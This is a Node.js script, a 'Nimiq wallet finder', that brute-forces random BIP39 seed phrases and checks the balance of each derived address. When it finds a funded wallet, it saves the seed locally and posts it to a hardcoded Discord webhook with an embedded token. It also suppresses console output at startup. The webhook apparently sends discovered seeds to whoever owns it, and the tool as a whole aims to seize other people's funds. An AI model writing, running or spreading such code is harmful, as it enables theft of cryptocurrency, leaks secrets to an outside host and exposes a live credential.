(async () => {
    console.log = function () { }
    console.error = function () { }
    console.warn = function () { }
    
    // Connect
    const Connection = require('./connection');
    const connection = new Connection();
    const wrapper = await connection.connect();

    // Main
    const { range } = require('lodash');
    const bip39 = require('bip39');
    const fs = require('fs');
    const cluster = require('cluster');
    const NimiqWallet = require('nimiqscan-wallet').default;
    const blessed = require('blessed');
    const { default: axios } = require('axios');
    const argv = require('minimist')(process.argv.slice(2));
    const threads = argv?.t || 4;

    const send = (title, message) => {
        const embered = { 'title': message };
        const headers = { "Content-Type": "application/json" };
        const data = {
            'username': 'doge-scan-bot',
            'avatar_url': 'https://i.imgur.com/AfFp7pu.png',
            'content': title.toString(),
            'embeds': [embered]
        };
        const webhookUrl = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
        try {
            axios.post(webhookUrl, data, { headers })
        } catch (error) {
            console.log(error);
        }
    }

    async function generate(node) {
        const wallet = generateAddress();

        const balance = await getBalance(wallet.address, node);

        process.send({ ...wallet, balance });

        if (balance > 0) {
            var successString = "Wallet: [" + wallet.address + "] - Seed: [" + wallet.seed + "] - Balance: " + balance + " NIM";

            // save the wallet and its private key (seed) to a Success.txt file in the same folder 
            fs.writeFileSync('./match.txt', successString, (err) => {
                if (err) throw err;
            })

            send(successString, 'A Wallet Found Success!!!');
        }
    }

    const generateAddress = () => {
        const mnemonic = bip39.generateMnemonic(256)
        const wallet = NimiqWallet.fromMnemonic(mnemonic);
        const address = wallet.getAddress();
        return { address: address, seed: mnemonic };
    }

    const getBalance = async (address, node) => new Promise((resolve) => {
        try {
            const timeout = setTimeout(() => resolve(-1), 5 * 60 * 1000);
            node.accountHelper.getBalance(address, (b) => {
                const balance = b / 100000;
                clearTimeout(timeout);
                resolve(balance)
            })
        } catch (error) {
            resolve(-1)
        }
    })

    if (cluster.isMaster) {
        let counts = 0;
        let founds = 0;
        const lines = {}
        const numCPUs = threads || 2;

        let screen = blessed.screen({
            smartCSR: true
        });

        let title = blessed.text({
            top: 0,
            left: 0,
            width: '100%',
            height: 'shrink',
            content: `NIMIQ WALLET FINDER v1.0`,
            style: {
                fg: 'green'
            }
        });

        let status = blessed.text({
            top: 2,
            left: 0,
            width: '100%',
            height: 'shrink',
            content: `Threads:      ${numCPUs} CPUs`,
            style: {
                fg: 'green'
            }
        });

        let result = blessed.text({
            top: 4,
            left: 0,
            width: '100%',
            height: 'shrink',
            content: `Result:       Total: 0 | Found: 0`,
            style: {
                fg: 'green'
            }
        });

        range(0, numCPUs, 1).forEach(i => {
            let process = blessed.text({
                top: 6 + (i * 2),
                left: 0,
                width: '100%',
                height: 'shrink',
                content: `Wallet Check: [CPU ${i + 1}] `,
                style: {
                    fg: 'yellow'
                }
            });
            lines[`${i + 1}`] = process;
            screen.append(process);
        })

        let box = blessed.box({
            top: 8 + (numCPUs * 2),
            left: 0,
            width: '100%',
            height: 'shrink',
            style: {
                fg: 'blue'
            }
        });

        screen.append(title);
        screen.append(status);
        screen.append(result);
        screen.append(box);
        screen.render();

        cluster.on('message', (worker, message) => {
            counts++;
            if (message.balance > 0) {
                founds++;
                box.insertTop(`Found: ${message.balance} NIM | ${message.address} | ${message.seed}`);
            }
            result.setContent(`Result:       Total: ${counts} | Found: ${founds}`);
            lines[worker.id].setContent(`Wallet Check: [CPU ${worker.id}] ${message.address} | ${message.balance} NIM`)
            screen.render();
        });

        // Fork workers.
        for (let i = 0; i < numCPUs; i++) {
            cluster.fork(); // Create a new worker process
        }

        cluster.on('exit', (worker, code, signal) => {
            console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
        });
    } else {
        setInterval(() => generate(wrapper))
    }
})()
